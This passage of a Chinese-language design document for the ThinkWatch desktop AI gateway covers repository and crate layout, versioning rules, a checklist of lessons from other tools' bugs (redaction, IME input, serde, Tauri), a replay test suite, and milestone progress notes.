路由规则引擎不进 core 这一条值得强调：桌面版的规则匹配的是「这次调用是什么样的活儿」（§3.4），企业版的路由表匹配的是「这个租户的这个模型该走哪条线」。两者只是名字都叫路由，语义完全不同。共用一个抽象会让两边都被迫迁就对方。

---

### 9.5 三个层面的拆分问题

「core 和 CLI 要不要再拆」这句话里藏着三个不同层面的问题，答案不一样：

| 层面 | 问的是 | 结论 |
|---|---|---|
| **仓库** | 要不要开一个 `thinkwatch-cli` 目录 | **不要** |
| **crate** | CLI 的代码和 core 的代码是不是同一个包 | **拆**，但拆的不是 CLI |
| **二进制** | `twcore serve` 和 `twcore config` 是不是同一个可执行文件 | **不拆** |

#### 仓库层面：不要第四个仓库

**CLI 和网关是同一个演进单元。** 控制面 API 每改一次，两边都要跟着改。放在同一个仓库，是一次提交、一次 CI、一次发版；拆开就是两个 PR、两次发版，还要维护一张版本兼容矩阵。而独立安装这个唯一的收益，用 feature flag 就能拿到（见下面的二进制层），不需要付一个仓库的代价。

一个人维护的项目，三个仓库已经不少了。

#### 但你这个问题暴露了一件事：core 现在有身份冲突

`thinkwatch-core` 现在同时是两个东西：

1. **给两个网关复用的协议层** —— 消费者是企业版**和**桌面版
2. **桌面版的完整引擎** —— 消费者只有桌面版

§9.4 的边界清单里已经写明：`tw-gateway`、`tw-control`、`tw-store`、`tw-observe`、`tw-engine` 这几个**企业版永不依赖**。也就是说 core 里有一大半东西，企业版的人打开这个仓库会完全用不上，甚至会困惑「为什么一个我要依赖的库里有个完整的桌面网关」。

**但这个不该用拆仓库来解决，用仓库内部分层加 README 就够了。** Cargo workspace 天然支持一个仓库里既有库又有 bin，企业版依赖 `tw-provider` 时不会编译 `tw-gateway`——依赖图是按 crate 算的，不是按仓库。

```
thinkwatch-core/
  crates/
    # ── 第一层 · 共用协议层 ──────────────────
    #    企业版和桌面版都依赖。改这里要考虑两边。
    tw-types      tw-protocol   tw-provider
    tw-resil      tw-redact     tw-crypto     tw-pricing

    # ── 第二层 · 桌面网关 ────────────────────
    #    只有桌面版用，企业版永不依赖。随便改。
    tw-config     tw-secret     tw-engine     tw-guard
    tw-store      tw-observe    tw-gateway    tw-control    tw-api

    # ── bin ─────────────────────────────────
    twcore        # serve + 客户端子命令
```

README 第一段就把这条线画出来：**第一层是契约，改动要谨慎且要同步验证企业版；第二层是桌面版自己的实现，随便改。** 这条线比仓库边界更有用，因为它是按「谁会受影响」划的，而仓库边界划不出这个。

#### 顺带确认另一条边界：引擎住 core，不住 lite

`thinkwatch-lite` 仓库里**只有 UI**（Tauri 壳加 React），引擎全部住在 core。

理由和 clash 生态一致：mihomo 是完整的网关，clash-verge 只是给它套了个界面。这样 `thinkwatch-core` clone 下来 `cargo build` 就是一个能跑的 headless 网关，服务器场景、Docker 场景、CI 场景全都不需要碰 lite 仓库。如果引擎住在名字叫「lite」的桌面仓库里，headless 用户要 clone 一个桌面应用来编译一个不需要 GUI 的东西，语义就拧了。

#### crate 层面：拆的不是 CLI，是它俩共享的那层

关键不是「把 CLI 挪出去」，而是**把控制面的契约独立成一个 crate**：`tw-api` 定义控制面 API 的请求响应类型加一个 client 实现。三个消费者：CLI、Tauri 的 Rust 侧、将来任何第三方 TUI 或脚本。

不拆这层的后果很具体：CLI 和 Tauri 各自定义一遍 DTO，某次改了 API 之后其中一个忘了跟，出现**只在某一个客户端上复现**的 bug。这类 bug 极难查，因为两边看起来都「对」。

额外的好处是它逼你把控制面 API 定清楚。`tw-api` 写下来就是 core 的公开契约，而不是让 UI 和 core 之间长出一堆隐式耦合。

#### 二进制层面：不拆

**主要理由是「一次编译一次测试」。** CLI 和服务端共享绝大部分依赖和全部类型定义，拆成两个二进制并不减少编译量，却多一次链接、多一套 CI 产物、多一份发布清单。

**版本 skew 是将来的加分项，不是现在的理由。** 服务端和 CLI 版本对不上、协议谈不拢，Docker 和 kubectl 让所有人都经历过，同一个二进制天然免疫。但既然已经决定**暂不对外分发**（§11），也就还没有自动更新器，这个问题此刻并不存在——把它当成决定性理由，是拿一个尚未存在的能力做论证。将来真要分发时它才会变成实打实的收益。

体积不构成理由：纯客户端约 5MB，完整服务端 15 到 25MB，差十几 MB，而 Tauri 应用本身就几十 MB。而且在 Rust 里，同一个 workspace 的两个二进制共享绝大部分依赖，分开编译并不省构建时间，反而多一次链接。

（参照：企业版 workspace 有 535 个依赖。桌面版去掉 Postgres、Redis、ClickHouse 之后估计落在 250 到 350，其中 CLI 独占的只有 clap 那一小撮。）

命令结构一刀切开：

```
twcore serve              # 唯一的服务端命令
twcore config get …       # 以下全部是客户端命令
twcore route test …
twcore provider list
twcore group select …
```

用 `serve` 而不是 `daemon`，因为它也经常前台跑。除了 `serve` 之外，其余每个子命令都只做一件事：连上 socket 问一句。

给真在意体积的人留个口子：

```toml
[features]
default = ["server", "cli"]
server  = ["axum", "rusqlite", …]
cli     = ["clap"]
```

`cargo install twcore --no-default-features --features cli` 编出一个纯客户端的小二进制。**这就是「独立 CLI」那个需求的答案**——不需要独立仓库，一个 feature flag 就够。

#### 一个必须解决的连带问题：CLI 怎么进 PATH

桌面应用装在 `/Applications/ThinkWatch Lite.app`，sidecar 在 `Contents/MacOS/twcore`，用户在终端敲 `twcore` 是找不到的。

学 VS Code：设置里给一个「安装命令行工具」按钮，symlink 到 `/usr/local/bin/`。同时支持 `brew install` 独立安装，覆盖不装桌面应用的场景。**两条路径必须是同一个二进制**——这也是不拆的收益之一：symlink 过去的那个和 sidecar 跑的那个，本来就是同一个文件。

---

### 9.6 版本号：应用按日期，库按语义

**一套版本号解决不了两种读者。**

- **应用**面向用户，他要回答的问题是「这东西多新、我该不该升」→ 日期最直观
- **库**面向依赖方（企业版、将来的第三方），他要回答的是「升上去会不会把我弄坏」→ 只有语义化版本能表达

我们两样都有，所以两套并存。这不是折衷，是因为它们本来就在回答不同的问题。

| 对象 | 方案 | 例子 | 谁读它 |
|---|---|---|---|
| **桌面应用** | CalVer `YYYY.MM.PATCH` | `2026.9.0` | 用户 |
| **`twcore` 二进制** | CalVer，同上 | `2026.9.0` | 用户 |
| **core 的 crate** | SemVer | `tw-provider 0.3.1` | 企业版、第三方 |
| **配置 schema** | 单调整数（§3.1） | `version: 1` | 迁移逻辑 |
| **控制面 API** | 单调整数 | `api: 2` | UI、CLI、第三方客户端 |

#### CalVer 的格式细节，有个真坑

**月份不补零**：写 `2026.9.0`，不是 `2026.09.0`。

原因很实际：**Cargo 和 Tauri 都要求版本是合法的 SemVer**，而 SemVer 明确禁止前导零。`2026.09.0` 会在 `cargo build` 的第一秒就报错。`2026.9.0` 恰好同时是合法的 CalVer 和合法的 SemVer，所以能用。

- `PATCH` 是当月第几次发布，从 0 开始：`2026.9.0`、`2026.9.1`、`2026.10.0`
- **不强制按月发布。** 跳月很正常，隔三个月发一次就是 `2026.12.0`。CalVer 只表达「什么时候发的」，不承诺「多久发一次」
- 开发构建带 git 短哈希：`2026.9.0-dev.a1b2c3d`。bug 报告能精确定位到 commit，这个成本几乎为零而价值很高

#### CalVer 不表达兼容性，所以兼容性得有别的出口

这是选 CalVer 必须接受的代价：`2026.9.0 → 2026.10.0` 完全看不出有没有破坏性变更。所以那些**真正需要协商兼容性**的地方，各自有独立的版本号：

- **配置 schema**（§3.1 的 `version: 1`）——决定要不要跑迁移
- **控制面 API**——UI 和 CLI 连上来时检查，不匹配就明确提示「请升级客户端」而不是让它以奇怪的方式失败

后一个尤其重要：既然二进制不拆（§9.5），日常不会有 skew；但第三方写 TUI、或者用户手动混用不同版本时，一个清晰的版本不匹配提示能省掉大量困惑。

#### 一个隐藏好处：一眼看出多久没更新

`1.4.2` 这个号码，你看不出它是上周发的还是三年前发的。`2026.9.0` 一眼就知道。

对一个准备开源的项目，**用户第一眼判断的就是「这项目还活着吗」**。CalVer 把这个信息直接印在版本号上，省掉了去翻提交历史那一步。

#### 两个仓库的版本关系

`thinkwatch-core` 和桌面版各自走自己的 CalVer——core 可以独立发布（headless 用户），所以它有时会领先。

三条规矩：

1. 桌面应用打包某个具体版本的 `twcore` 作为 sidecar，**About 页面把两个版本都显示出来**
2. 两者的**控制面 API 版本必须匹配**，不匹配时 UI 直接报错并说明，不要尝试兼容
3. core 的 crate（第一层那六个）用 SemVer，和 `twcore` 二进制的 CalVer 是两回事——同一个仓库里 `tw-provider` 是 `0.3.1` 而 `twcore` 是 `2026.9.0`，这不矛盾，它们卖给不同的人

---

### 9.7 别人用血换来的清单

以下每一条都对应 cc-switch 或 sub2api 的一次真实事故。它们不改变架构，所以不该散落在各章里稀释掉主线；但每一条都会在实现时咬人一口，所以集中放在这里，**当作代码审查的检查项**。

#### 会毁掉用户数据的（最高优先级）

**中文输入法 + 受控 input = 配置被写坏。** cc-switch 报告过一个案例：在表单里用中文输入法快速输入，**一个 12 字符的值膨胀成了 1396 字符**。根因是受控组件在输入法还持有 composition range 时把 state 写回 DOM，而且对每一个中间态都跑了一遍归一化。更阴的是 **WebKit 在窗口切换时不发 `compositionend`**——用户输到一半点了别的窗口，事件永远不来。

我们是 Tauri（WebKit）+ 中文用户 + API key 输入框，**这三个条件全中**。做法：所有配置类输入用同一个 IME-safe 组件，composition 期间保持本地状态不回写，`blur` 时强制提交未完成的 composition。已经写坏的值救不回来。

**macOS 会自动把 API key 的首字母大写。** 所有配置输入框显式关掉 `autocomplete` / `autocorrect` / `autocapitalize` / `spellcheck`。一行属性的事，不写就是一类稳定复现的「key 明明是对的却认证失败」。

**还原不能擦掉我们没管的文件。** cc-switch 的还原逻辑把用户手写的 `CLAUDE.md` 清空了，因为那个文件从来不在同步内容里，却被当成「属于这个 app 的状态」一起还原。还原的作用域必须和写入的作用域**严格一致**——我们写了哪几个字段，就只还原哪几个字段。

**备份必须原子发布。** cc-switch 的备份是先用最终文件名创建、再往里拷，且忽略拷贝结果——**一次中断的拷贝就成了一个看起来有效的备份**。写临时文件、校验、再 rename。另外：保留策略要显式保护「正在被还原的那一份」和「刚做的安全快照」，否则一个小的保留数量设置会在最坏的时刻删掉它们。

#### Rust / Tauri 特有的坑

**`#[serde(untagged)]` 会把所有写错塌成同一句话。** §3.8 有一条「让 serde 自己说」——「unknown field `prot`, expected one of ...」比我们能补的任何一句都准。**那条在 untagged 枚举上失效**：全部变体都不匹配时，serde 只会说 `data did not match any variant of untagged enum Secret`，既不说它看见了什么，也不说该写成什么，而且**把每一种写错都塌成同一句**——`oauth` 少写一个必填字段、字段名打错一个字母、随手写了个不存在的键，报出来一模一样。

而 `key:` 恰好是配置里最重要的那个字段。对策是加一个排在最后的兜底变体接住原始值，在校验那一层拿着它说人话；`oauth:` 存在时**再手动把 serde 那条路走一遍**（拿 `from_value::<OAuth>` 的错误），这样「unknown field `refresh_befor`, expected one of ...」还是由 serde 自己说出口。

**任何 untagged 枚举都要问一句：全都不匹配的时候，用户看到的是什么。**

**按形状打码挡不住没有形状的密钥。** 这一条是 OAuth 那一轮撞出来的，而它比 OAuth 本身值钱。

诊断包（§9.6）把 config.yaml 原文附在最后，走的是一个**按值的形状**认密钥的函数（`sk-ant-…`、`ghp_…`）。实测这三样原样穿了过去：

```yaml
key: mycompany-internal-token-9911   # 自建中转的 key，长得很普通
key:
  oauth:
    refresh: 1//0gLdOPAQUE           # OAuth 的 refresh token，不透明
    client_secret: cs-whatever
```

而那一段的正上方就印着「这份内容里的密钥都已经打码」。**一个做不到的承诺比不承诺更危险**，因为它正是用户决定「可以贴到 issue 里」的依据。

对策是**按字段名打，因为 schema 就是答案**：配置是我们自己定义的结构，哪个字段装密钥不需要猜。猜值的形状永远会漏掉下一种没见过的格式。两层叠加，不是二选一。同一条也适用于对方回给我们的错误正文——OAuth 的 token 端点经常把请求参数回显出来，而**我们知道自己刚发出去的是哪几个值**，所以那里能精确地抹，不必依赖任何模式。

名单里故意多带了几个 schema 里还没有的通用名（`token` / `password` / `secret`）：**这一层的两种错误代价差得很远**——多打一个码，损失是诊断包里少一条信息；少打一个码，损失是一份凭据。

反过来也有一条：**不是密钥的东西不能跟着打掉。**行内打码原来只要看见值里有 `://` 就把整段按 URL 处理，于是 `# 从 https://a.example.com/v1 换到了 /v2，别忘了` 这样一行会在第一个 URL 处被截断，而后半句往往正是排查时要看的东西。判据改成**值本身是不是 URL**；只是「值里带了个 URL」时，只打掉带 `user:pass@` 的那一段，路径留着 —— **路径是排查时要看的，userinfo 才是凭据**。

还有一条是写这几个测试时才撞出来的：**注释行整个漏在按字段名那一层之外。**它按第一个 `:` 切键名和值，而 `# 上游换成了 https://bob:hunter2@relay/v1` 的第一个 `:` 在 `https` 后面 —— 于是「键名」是「# 上游换成了 https」，不是密钥名，整行原样放过。而诊断包是**带着注释一起交出去的**。现在按字段名那一层之后再兜一次底：整行里带 `user:pass@` 的 URL 一律打掉。

**按字节切字符串会 panic。** 掩码 API key、截断日志时，`&s[..20]` 遇到跨界的多字节字符直接 panic。cc-switch 在这上面**栽了两次，间隔八个月**——第一次是掩码 key，第二次是掩码代理地址，一个粘进配置的中文字符串就够了。Rust 比 Go 还严格（Go 只是切出乱码，Rust 直接 panic）。统一走 `char_indices()` 或 `floor_char_boundary`，并且写进 clippy 检查。

**Tauri v2 的 capability 漏配是静默失败。** cc-switch 漏了 `process:allow-exit`，结果恢复界面上的「退出」按钮**被 IPC 层默默拒绝**，点了没反应、没有报错、没有日志。每加一个新的 Tauri 命令，都要确认对应 capability 在清单里。

**`toml_edit` 的 `Item::get_mut` 会凭空造出一张表。** 它走的是 `IndexMut` 语义，键不存在时当场插一个进去。于是「删掉一个本来就没有的字段」反而给用户的配置里添了一行 `a = {}`——一个只该做减法的操作做了加法。要用 `as_table_like_mut().and_then(|t| t.get_mut(k))`。M4 写 tw-adopt 时被测试抓住的。

**serde 的 `deny_unknown_fields` 不是可选项，是安全网。** M4 写路由试算的测试时撞到：`Group` 的字段在 Rust 里叫 `kind`、在 YAML 里叫 `type`，而 `Group` 和 `Route` 都没有这一行，于是 `kind: load-balance` 被**静默丢掉**——用户拿到一个 fallback 组，还不知道为什么负载均衡没生效。

和之前 `listen: { addr: ... }` 那次是同一类。判据很简单：**只要一个字段在两种表示里名字不同，「顺手写成另一个」就是必然会发生的**，而没有这一行，它的下场是静默降级而不是报错。

**Tauri 的 `invoke` 用字符串 reject，不是 Error 对象。** 前端 `catch (e)` 拿到的 `e instanceof Error` 永远是 false，`e.message` 永远是 undefined。所有错误处理路径都要按「可能是裸字符串」写。updater 插件同理。

**GUI 应用继承的 PATH 和用户 shell 的 PATH 不是一回事。** 从 Finder / launchd 启动的应用拿到的是极窄的 PATH，看不到 nvm、Homebrew、Volta。凡是要探测或调用外部 CLI 的地方（§7.11 的客户端检测），都要走一次 login shell 取真实 PATH。代价是每次多 spawn 一个会执行用户 rc 文件的 shell，所以结果要缓存。**读的时候通过 `/usr/bin/env` 读，不要 `echo $PATH`**——fish 把 PATH 存成列表，echo 出来是空格分隔的。

**主题要在首次绘制之前应用。** 窗口显示早于主题 class 应用，用户就会看到一次白闪或黑闪。用一段内联的、在 bundle 加载之前同步执行的脚本读取已保存的主题。

#### 设计层面的小规矩

**布尔开关要命名成「零值 = 安全」。** Rust 的 `#[derive(Default)]` 和 Go 的零值有完全相同的陷阱：一个手工构造的、没走完整加载流程的 config（测试、工具、迁移路径），其 `bool` 字段是 `false`。所以保护性开关一律命名为 `disable_xxx` 而不是 `enable_xxx`，让「忘了设」落在安全那一侧。这条对 §5 的三道防线尤其重要。

**重试要设总预算，而不只是最大次数。** 次数约束不了用户的体感——3 次重试可能是 300ms 也可能是 30 秒。加一个 `retry_total_budget`（比如 5s），超了就不再重试，直接把上游的真实错误交给客户端。这直接约束 TTFT 的长尾。

**会变的厂商事实，存成运行时查表，不要存成创建时快照。** cc-switch 的预设改动只对新建的条目生效，老条目永远停在它被创建时的样子——于是每个版本的升级说明里都要重复一遍这个警告。我们的定价表（§4.3.0，来自 LiteLLM）和模型清单（§3.9，来自 L2 探测）已经是查表模式，**要守住**：不要为了「快一点」把厂商信息快照进用户配置。

**客户端 SDK 自带的超时头不能透传给上游。** `x-stainless-timeout` 这类头传到上游，会让上游按客户端的超时提前断流——表现为莫名其妙的截断。§4.1 的 header 处理里要把这类头剥掉。

**SQLite 的 schema 版本要有「太新」的应用内恢复界面，而且检查必须在任何 DDL 之前跑。** 用户装了新版、写了新 schema、又降回旧版，旧版看到不认识的 `user_version` 就打不开了。cc-switch 早期在这里是一个「重试 / 退出」的原生弹窗，而重试每次都必然失败——**应用永久打不开，没有出路**。正确做法是一个专门的恢复界面，提供「升级应用」和「干净退出」两个真实可用的动作。

**日志不要每次启动清空，但持久化之前必须脱敏。** cc-switch 的原话很到位：「解释崩溃原因的那份日志，等应用重开的时候已经没了」。改成轮转保留之后，紧接着要处理的是——**持久化的日志会被用户直接贴进 issue**。我们是个看得见所有 API key 的网关，这件事的风险比一般应用高一个量级：

- URL 只记 origin（凭据可能嵌在 path 里，query 更不用说）
- 请求和响应的 body **永不记录**，只记字节数、短哈希、和一个安全的分类（`sse` / `json` / `binary`）
- 响应头走白名单，不在名单上的只记名字不记值
- 脱敏要**按属性名 + 按值形态**双层（高熵串、`sk-` 前缀、PEM 头都要认），只匹配字段名会漏
- 超大的结构化输入**整个丢弃，而不是截断**——截断后的 JSON 会退化成字符串，反而绕过强的那层脱敏

**脱敏要做成统一原语，和备份一样。** cc-switch 的深链接确认框对敏感字段做了很仔细的脱敏（API key 只留前四位、按键名匹配 `TOKEN`/`SECRET`/`PASSWORD` 一类），但**同一个应用的环境变量冲突面板里，变量值是明文直接显示的**——那里面装的正好就是 API key。同一个程序，两个界面，两套标准。

这和备份是同一个病：**安全措施按界面各自实现，就一定会漏掉某一个界面。** 脱敏必须是一个所有输出路径（日志、UI、导出、错误信息、剪贴板）都必须经过的函数，不是每处自己写一遍。

**给配置项的「可达性」写一个守卫测试。** sub2api 踩过一个很隐蔽的坑：某些配置项只出现在示例文件里、没有注册默认值，于是**环境变量读进来之后被静默丢弃**，纯环境变量驱动的部署拿到的是零值且没有任何告警。具体机制是 viper 的，但形态是通用的——`serde` + `figment` 有同类问题。一个二十行的测试（反射遍历配置结构体，断言每个字段都能被文件和环境变量设置）成本极低，能挡住一整类「配了但没生效」。

---

### 9.8 回放测试集：唯一能对抗方言漂移的东西

风险表里写着「上游方言的持续漂移」，对策是「建立回放测试集」。**但那句话之外，全文没有任何设计。** 而这一路积累的证据全都指向同一个方向：

- Codex 在一个 **patch 版本**里改了 `auth.json` 的语义，打死了所有第三方切换工具
- codex-cli 0.147 默认打开 goals，让一个开关变成谎报
- grok 0.2.112 把自更新挪到 npm，GUI 应用的窄 PATH 炸掉
- 客户端 SDK 自带的 `x-stainless-timeout` 透传给上游会导致提前断流
- 同一个字段在不同上游叫 `reasoning_content` / `reasoning` / `reasoning_details`

**这类故障有一个共同点：我们的单元测试全绿，用户照样挂。** 因为漂移发生在上游，不在我们的代码里。普通测试防不住它——只有拿真实流量反复回放才行。

#### 我们有一个别人没有的优势：本来就看得见所有真实流量

cc-switch 和 sub2api 要专门构造 fixture。**我们是网关，每一个请求和响应本来就在 §8 的存储里。**

所以「录制」不是一个新功能，是**把已有的观测数据变成测试夹具**——Requests 详情页加一个「另存为测试用例」按钮，几十行代码。

#### 脱敏是录制的一部分，不是事后补的

录下来的是真实请求：里面有 API key、有用户的代码、有 system prompt。**落盘之前必须走一遍 §5.1 的脱敏管线**，而不是先存原始再想办法清洗。

理由和 §9.7 那条日志脱敏一样，但更硬：**测试夹具会进 git**。一个装满真实密钥的 fixture 目录被 push 上去，就再也收不回来了。

#### 回放有两个方向，防的是两件不同的事

| 方向 | 喂什么 | 验什么 | 防的是 |
|---|---|---|---|
| **上游回放** | 录制的上游响应 → 我们的解析器 | usage 四维、成本、`stop_reason`、工具调用、错误映射 | **上游变了** |
| **客户端回放** | 录制的入站请求 → 我们的管线 | 路由决策、模型准入、探测识别 | **我们自己改坏了** |

第一个是主力，第二个是回归网。

#### 判据不是字节相等

上游响应里有时间戳、request id、随机的 message id。**逐字节比对会每次都失败，然后所有人开始忽略它**——这是测试集死掉最常见的方式。

比对的是**提取出来的语义**：四个 token 维度的数值、算出来的成本、`stop_reason`、工具调用的名字和参数、错误落到哪个分类。这些才是我们真正依赖的东西。

#### 一个反直觉的用法：它同时解决了「零上传」和「可支持性」的矛盾

§12 承诺零上传，这意味着用户报 bug 时我们什么都看不到。通常的替代是「请贴一下日志」——而日志里有密钥（§9.7）。

**回放用例给了第三条路**：让用户点「导出这次请求为测试用例」发过来。那是一个**脱敏过的、可回放的、不含密钥的**文件，比日志更有用也更安全。

**这条不需要额外做任何事**，它是录制加脱敏两件事凑在一起白捡的。但它值得写进文档，因为它会改变支持流程的设计。

#### 排期

**录制按钮和脱敏在 M3**（那时存储和脱敏管线都在）。**回放执行器和 CI 接线在 M5 之后**——在此之前录着，攒够真实语料再写断言，比先写框架后补数据靠谱。

> **做完了**（2026-09-10）。语料在 `crates/tw-gateway/tests/fixtures/`，
> `cargo test --workspace` 会全部回放一遍。
>
> 实现时定下来的三条：
>
> **一、提取器必须复用线上那两个。**`RequestFacts::from_anthropic_body`
> 和 `usage::Sniffer` —— 另写一份提取逻辑的话，**回放验的是那一份，而
> 线上跑的是另一份**，那时测试集绿着而用户挂着。有一条测试专门盯这件事。
>
> **二、种子语料要写明来历。**五个种子是「按 §4.3 的方言表构造」的，
> 不是实录 —— 它们能挡住我们自己的回归，但挡不住「文档写错了」。
> **「实录」和「按文档构造」的可信度差一个量级**，一个没有来历的用例，
> 出问题时没人知道该信它还是信代码。所以有一条测试要求每个用例的
> `note` 非空。
>
> **三、`expect` 是冻住的，别顺手重新生成。**给 `Extracted` 加一个维度
> 会让老用例全红 —— **那是对的**，它说明判据变了，需要人来决定每一条该
> 是什么。写个脚本把所有 `expect` 刷一遍，等于把这个测试集变成一面镜子：
> 它会永远同意你，也就永远抓不到东西。

---

## 10. 里程碑

安全功能没有堆成一个里程碑，而是拆成三处，各自跟它最相关的基础设施一起做。

| | 主题 | 周 | 做完之后能干什么 |
|---|---|---|---|
| **M0** | 骨架与共用层 | 3–4 | Claude Code 能通过它正常干活 |
| **M1** | 路由与代理 | 3–4 | 按模型分流、走代理、不重启切换 |
| **M2** | 配置双向同步 | 3–4 | UI 和手改互不打架，改坏能回滚 |
| **M3** | 观测与计价 | 3–4 | 知道钱花在哪、哪家慢 |
| **M4** | 接管与静态扫描 | 4–5 | 一键接管所有客户端，扫出恶意配置 |
| **M5** | 数据面守卫 | 2–3 | 密钥不外泄，投毒能拦下 |
| | | **19–24 周** | 单人全职约五到六个月 |

**这个数字是上修过的。** 初稿估 9–11 周，那是把「企业版切换并观察一周」「YAML 增量写入层」「五个客户端各自的字段级合并」这类活儿按理想情况算的结果。按 2.5 倍上修更接近现实。业余时间做的话再乘三。

**顺序也调了一次**：原方案先做配置双向同步再做路由，现在反过来。理由是**先要有能用的东西**——路由和代理跑通了才能验证整个方向对不对，而双向同步是体验优化，晚两个月不影响可用性。

### M0 — 骨架与共用层（3–4 周）

> **进度：主干已通。** 2026-09-08 一天做完了三块 —— `CallCtx` 接口重构、
> 第一层五个 crate 的切出与企业版反向依赖、以及数据面加控制面的端到端跑通。
> 企业版 639 个测试、core 144 个测试全绿，两边 clippy `-D warnings` 干净。
>
> **能跑起来的样子**：`twcore init` 生成配置（`0600`，一把 `tw-` 前缀的网关
> 密钥），`twcore check` 校验并说清每个上游的协议，`twcore serve` 同时起
> 数据面和控制面 —— 一个带工具定义的 Claude Code 请求原样转发出去、SSE
> 逐帧流回来、网关密钥被换成上游的真 key、`/events` 上同步出现三条带同一
> 个 id 的生命周期事件。
>
> **同一天下午补完了 UI 侧**：Tauri 2 + React 19 + Tailwind v4 的骨架、
> 守护（三信号里的子进程退出这条 + 完整退避阶梯 + 安全模式）、控制面
> 客户端、实时请求列表。**两个方向都实测过**：杀 core，UI 立刻把它拉
> 起来；杀 UI，core 跟着退。连杀六次进安全模式，core 以 `--safe` 重起、
> 只保留控制面。
>
> **§7.6 的五步全部跑通了**（M0 的最后一条验收）：从一个空目录开始，
> core 自己生成配置 → UI 问 base_url 和 key → 零成本探测 → 写下 provider →
> 自动重启 core → 给出可复制的片段 → 等第一个请求。
>
> 这一步改了两处设计，都是实现时才看出来的：
>
> 1. **零 provider 的配置是合法的。** 原来 `validate` 拒它，于是全新安装
>    时 core 起不来 —— 而 core 起不来意味着控制面也起不来，**UI 连「你还
>    没配上游」都说不出口**，只能显示一个启动失败。正确的分法是「配置
>    合法」和「能转发」是两件事。
> 2. **`twcore serve` 自己生成配置。** 原来是「加载失败，去跑一次
>    `twcore init`」—— 而真正的首次运行里没有人会去跑 init，UI 直接
>    spawn 的就是 serve。这个 bug 被我之前几次手动跑过 init 的 smoke test
>    掩盖了，从空目录测一次就露出来了。
>
> 顺带把模型清单的空值拆开了：**「上游没这个接口」「我们没认出格式」
> 「真的一个都没有」是三件事**，塌成一个空列表之后 UI 只能说「这家不
> 提供模型列表」——而那在第二种情况下是编的，把我们自己的解析缺口说成
> 了对方的特性，然后没人会去修解析器。
>
> **菜单栏也做了**（§7.4）：52×22 逻辑像素、两行文字、手写的 5×7 点阵
> 字形、每秒推一次 RGBA。**不用字体光栅化器**是刻意的 —— 真字体在 7px
> 下会糊，而且宽度不受我们控制，而「宽度抖动」那条要的正是固定宽度。
> 文字没变就不重画（不是数字没变 —— 每个请求都动一点花费，但显示只有
> 两位小数），这直接兑现 §4.5 的空闲 CPU 目标。
>
> 花费和速率现在是 `None`，显示破折号 —— 它们要等 M3 的计价才有真数，
> **而画一个 `$0.00` 会是一个断言：今天没花钱**。那不是我们知道的事。
>
> **心跳和开机自启也做完了。** 心跳那条实测过：给 core 发 SIGSTOP
> （**进程还在、socket 还在、就是不回话**），28 秒判死并换掉，冻住的旧
> 进程也清干净了 —— SIGTERM 对 stopped 进程无效，靠的是后面那个 SIGKILL。
> 前两条信号对这种情况完全是瞎的。
>
> 自启按 §2.4 走：只注册 GUI，core 不单独注册；每次启动校验 plist 里的
> 路径（**App 被挪走后自启会静默失效，而插件的 `is_enabled()` 仍然说
> 「开着呢」**）；`--autostart` 时根本不创建窗口而不是创建后隐藏；托盘
> 图标在守护之前就建好，不等 core 就绪。
>
> **还没做的**：M0 到此为止，剩下的都是 M1 及以后 —— 路由引擎、出站
> 代理、L3 测速、错误契约的完整实现。

**第一周先做接口重构**（§9.4）：把调用者身份从 `ChatCompletionRequest` 里剥出来改成独立的 `CallCtx`。它决定 core 的公开接口长什么样，晚做要返工两次。

> **✅ 已完成**（分支 `refactor/call-ctx`）。实际规模比估的大：**21 个文件、+267/−102 行**，不是「七个 provider 文件」——provider 只占 7 个，其余是 handlers、失败转移与前缀均衡这两个包装 provider、路由、协议重学、以及散落各处的测试 mock。**改完 703 个单元测试全绿，clippy `-D warnings` 干净。**
>
> 三个实现时才浮现的决定：
>
> 1. **`ctx` 按值传，不按引用。** `stream_chat_completion` 返回的是 `'static` 流，它活得比任何调用方能借出的引用都长——`request` 本来就是按值传的，`ctx` 跟着它走最省事。§9.4 里写的 `&CallCtx` 只对非流式成立。
> 2. **`attrs` 字典从第一天就用，不留具体字段。** 企业版现在只有 `user_id` / `user_email` 两个键，但如果先写成具体字段，加 `team_id` 时就要改 core 的签名——那正是这次重构想避免的返工。
> 3. **模板替换自己写，别用 `str::replace` 链。** 原来是 `.replace("{{user_id}}", uid).replace("{{user_email}}", email)`，加一个键就多一次全串扫描。换成一次遍历，顺带处理了未闭合的 `{{`（原样保留而不是截断，**截断会悄悄改短一个 header 值**）。

然后从企业版切出第一层的四个 crate（`tw-protocol` / `tw-provider` / `tw-resil` / `tw-crypto`），企业版加路径依赖并**编译通过、测试全绿**。

> **✅ 已完成，三处和设计不一样：**
>
> 1. **`streaming.rs` 不该进 `tw-protocol`。** §9.0.1 把它算进那 900 行里，
>    但它依赖 axum 的 SSE 响应类型、metrics、和企业版的 PII 流式还原器 ——
>    **那是 HTTP 层，不是协议层**。搬进来会让共用层背上 axum，而两个版本
>    都要扛着。实际是 452 行（`sse_parser` + `transform`），桌面版的数据面
>    自己写响应封装。
> 2. **`tw-crypto` 得有自己的错误类型。** `json_secret` 原来返回企业版的
>    `AppError::Internal`，那会把整个错误枚举拖进共用层 —— **core 不该认识
>    调用方怎么给失败分类**。顺带：`crypto.rs` / `json_secret.rs` 这一对
>    **暂时不切**，因为换错误类型要动十来个调用点，那是独立的一次改动、
>    独立的爆炸半径（§9.3 说按接口稳定性分层，不一次切）。
> 3. **企业版侧用再导出而不是改调用方。** 搬走的模块原地留一个
>    `pub use tw_provider::…`，于是那次提交之外一行都没改。注意 §9.4 的迁移第 4 步「切一个协议观察一周」**不放在 M0**——那是 M3 期间的事，M0 只要求两边都能编译、等价性测试通过。

core 起 gateway 透传 `/v1/messages`；Tauri 起 sidecar，unix socket attach 控制面，显示实时请求列表。Tauri 侧的进程生命周期要做全（§2.2 的 lock 文件、僵尸检测、父进程 watch、退出时 kill）——这块比看起来费时间。

**守护也在这一步**（§2.2.1），但只做骨架：三信号检测、指数退避、连续失败停止。安全模式和诊断页排到 M2（那时配置读写和历史回滚才就位，安全模式才有东西可给）。

配置做两件事：**生成初始配置**（§7.6，整文件生成）和只读加载。**`${ENV}` 插值也在这里**——十几行代码，却是 M2 之前唯一能让人不把 key 写进文件的手段。

**网关密钥这一步就要有**（§5.4）：首次启动自动生成，默认拒绝无密钥请求。晚加会导致早期所有客户端配置都要重写一遍。

**验收**：Claude Code 指向本地能正常干活，含流式和工具调用；企业版跑在共享 crate 上且测试全绿；无密钥请求被拒；§7.6 那五步走得通。

### M1 — 路由与代理（3–4 周）

> **路由引擎已完成**（2026-09-09）。`tw-engine`：`when` 结构化条件、
